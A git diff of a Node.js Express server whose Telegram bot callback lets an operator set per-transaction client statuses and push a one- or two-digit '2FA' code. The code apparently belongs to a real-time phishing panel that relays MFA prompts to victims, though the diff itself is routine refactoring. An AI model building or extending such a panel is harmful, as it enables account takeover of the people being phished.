@@ -90,21 +90,16 @@ app.post('/enviar', async (req, res) => {
 });
 
 // -----------------------------------------------------------
-//  /callback (maneja botones inline) + NUEVO: comandos de texto (/txid 22)
-// -----------------------------------------------------------
-// -----------------------------------------------------------
-//  /callback (maneja botones inline) + comandos de texto (/txid 22 o /txid reset)
+// /callback (maneja botones inline) + comandos de texto (/txid 22 o /txid reset)
 // -----------------------------------------------------------
 app.post('/callback', async (req, res) => {
   // 1. Manejo de callback de botones inline
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
     if (!callback || !callback.data) return res.sendStatus(400);
-
     const [accion, txid] = callback.data.split(":");
     clientes[txid] = { status: accion };
     guardarEstado();
-
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -114,14 +109,12 @@ app.post('/callback', async (req, res) => {
       }),
       agent
     });
-
     return res.sendStatus(200);
   }
 
-  // 2. Manejo de comandos de texto: /txid 22  o  /txid reset
+  // 2. Manejo de comandos de texto: /txid 7 o /txid 42 o /txid reset
   if (req.body.message?.text) {
     const text = req.body.message.text.trim();
-
     if (text.startsWith('/')) {
       const parts = text.slice(1).split(' ');
       const txid = parts[0];
@@ -141,10 +134,8 @@ app.post('/callback', async (req, res) => {
           });
           return res.sendStatus(200);
         }
-
         clientes[txid] = { status: "esperando" };
         guardarEstado();
-
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -154,12 +145,11 @@ app.post('/callback', async (req, res) => {
           }),
           agent
         });
-
         return res.sendStatus(200);
       }
 
-      // Segundo: comando para código 2FA (exactamente 2 dígitos)
-      if (comando && /^\d{2}$/.test(comando)) {
+      // Segundo: comando para código 2FA (1 o 2 dígitos, 1-99)
+      if (comando && /^\d{1,2}$/.test(comando) && Number(comando) >= 1 && Number(comando) <= 99) {
         if (!clientes[txid]) {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -188,7 +178,6 @@ app.post('/callback', async (req, res) => {
           }),
           agent
         });
-
         return res.sendStatus(200);
       }
 
@@ -198,11 +187,10 @@ app.post('/callback', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: req.body.message.chat.id,
-          text: `⚠️ Formato incorrecto.\n\nComandos válidos:\n• /txid 22 → enviar código 2FA\n• /txid reset → volver a espera`
+          text: `⚠️ Formato incorrecto.\n\nComandos válidos:\n• /txid 5    → enviar código 2FA (1-99)\n• /txid 42   → enviar código 2FA\n• /txid reset → volver a estado inicial`
         }),
         agent
       });
-
       return res.sendStatus(200);
     }
   }
